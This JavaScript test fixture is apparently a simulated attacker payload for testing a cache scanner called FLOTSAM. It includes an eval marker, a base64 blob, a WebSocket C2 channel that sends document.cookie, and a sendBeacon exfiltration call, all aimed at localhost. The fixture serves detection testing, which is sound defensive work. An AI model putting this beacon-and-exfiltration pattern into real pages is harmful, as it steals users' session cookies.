// Simulated attacker payload staged in the victim's Service Worker Cache.
// Contains the markers FLOTSAM hunts for (eval, atob, C2 channel, exfil).
/* padding to prove full-body scanning beats truncation ----------------------
   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
   -------------------------------------------------------------------------- */
(function () {
  const blob = atob('ZXhmaWx0cmF0ZSBldmVyeXRoaW5n');
  const run = eval;                          // dynamic exec marker
  const c2 = new WebSocket('wss://127.0.0.1:8001/c2');
  c2.onopen = () => c2.send('beacon:' + document.cookie);
  navigator.sendBeacon('http://127.0.0.1:8001/collect', blob);
})();
